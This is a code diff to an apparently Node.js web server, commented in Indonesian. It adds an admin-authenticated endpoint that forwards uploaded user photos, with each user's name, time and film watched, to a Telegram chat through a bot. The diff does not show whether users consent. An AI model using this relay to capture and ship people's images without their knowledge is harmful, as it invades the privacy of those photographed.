@@ -440,8 +440,67 @@ setInterval(() => {
 }, 10000);
 
 // ===========================
-// MANAGE VIDEOS API
+// CAPTURE FOTO & KIRIM TELEGRAM
 // ===========================
+const multer  = require('multer');
+const upload  = multer({ storage: multer.memoryStorage(), limits: { fileSize: 10 * 1024 * 1024 } });
+
+app.post('/api/capture', upload.single('photo'), async (req, res) => {
+  // Verifikasi token admin
+  const token = (req.headers['authorization'] || '').split(' ')[1];
+  if (!token) return res.status(401).json({ success: false, message: 'Unauthorized' });
+  try {
+    const decoded = jwt.verify(token, JWT_SECRET);
+    if (decoded.role !== 'admin') return res.status(403).json({ success: false, message: 'Forbidden' });
+  } catch {
+    return res.status(401).json({ success: false, message: 'Invalid token' });
+  }
+
+  if (!req.file) return res.status(400).json({ success: false, message: 'Tidak ada foto' });
+
+  const { name, waktu, tanggal, film } = req.body;
+
+  try {
+    // Kirim foto ke Telegram via sendPhoto
+    const FormDataNode = require('form-data');
+    const form = new FormDataNode();
+    form.append('chat_id', TELEGRAM_CHAT_ID);
+    form.append('photo', req.file.buffer, {
+      filename:    'capture.jpg',
+      contentType: 'image/jpeg'
+    });
+    form.append('caption',
+`📸 <b>Foto Pengguna Masuk</b>
+
+👤 <b>Nama</b>    : ${name || '—'}
+📅 <b>Tanggal</b> : ${tanggal || '—'}
+🕐 <b>Waktu</b>   : ${waktu || '—'}
+🎬 <b>Film</b>    : ${film || '—'}
+
+— <i>Layar Biru Dashboard</i>`
+    );
+    form.append('parse_mode', 'HTML');
+
+    const tgRes = await fetch(
+      `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendPhoto`,
+      { method: 'POST', body: form, headers: form.getHeaders() }
+    );
+    const tgData = await tgRes.json();
+
+    if (tgData.ok) {
+      console.log(`[CAPTURE] Foto ${name} terkirim ke Telegram`);
+      res.json({ success: true });
+    } else {
+      console.error('[CAPTURE] Telegram error:', tgData.description);
+      res.json({ success: false, message: tgData.description });
+    }
+  } catch (err) {
+    console.error('[CAPTURE] Error:', err.message);
+    res.status(500).json({ success: false, message: err.message });
+  }
+});
+
+
 
 const fs = require('fs').promises;
 const VIDEOS_FILE = path.join(__dirname, 'data', 'videos.json');
